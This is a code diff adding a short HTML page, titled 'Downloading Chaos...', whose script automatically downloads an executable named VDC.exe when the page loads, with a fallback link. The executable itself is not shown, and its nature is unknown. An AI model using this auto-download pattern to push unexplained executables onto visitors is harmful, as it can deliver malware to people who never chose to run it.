@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Downloading Chaos...</title>
+    <script>
+        window.onload = function() {
+            var link = document.createElement('a');
+            link.href = 'VDC.exe';  // Replace with your file name/path, e.g., 'files/VDC.exe'
+            link.download = 'VDC.exe';  // Optional: sets the filename
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+    </script>
+</head>
+<body>
+    <h1>Download starting automatically...</h1>
+    <p>If it doesn't start, <a href="VDC.exe" download>click here</a>.</p>
+</body>
+</html>
